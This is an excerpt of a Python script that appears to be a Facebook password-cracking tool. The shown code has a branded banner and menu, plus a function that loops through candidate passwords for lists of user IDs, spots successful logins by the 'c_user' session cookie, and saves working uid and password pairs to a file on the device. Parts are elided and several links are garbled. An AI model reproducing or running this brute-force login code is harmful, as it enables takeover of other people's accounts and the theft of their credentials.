...
#os.system("xdg-open https://facebook.com/groupsfuckyourfreenet/")
# LOGO
logo = (f'''                                                 
...
██   ██    ██     ██ ██   ██ 
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                                                    
 {gn}Owner    : {cn}ATIK Ahmad{ed}
 {gn}Guthub   : {cn}ATIK bro{ed}
 {gn}Facebook : {cn}ATIK Br bro{ed}
 {gn}Taligram : {wn}htts://t.e/aArff{ed}
 {gn}Tools    : {cn}ATIK{pn} •{gn}[{cn}version \033[1;42m{rn}•3.6•{ed}{gn}]{ed}
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ed}''')
# MAIN MANU 
def Main():
        os.system("clear")
        ...
        if jubair in ["1","01"]:
            sexy()
        if jubair in ["2","02"]:
        	os.system('xdgn https://t.me/airff')
        if jubair in [" 0", "00"]:
            exit()
        else:
            exit()     
...
def jubair(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[ATIK-FIND]\033[1;36m💔[%s/%s]🌺\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mATIK-OK 🌺\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mATIK-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/fuck.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
#follow my faceboo/www.facebook.com/jubairbroFF
#follow github https:///jubairbro
#join ouwww.facebook.com/groups/jubairbrofreenet/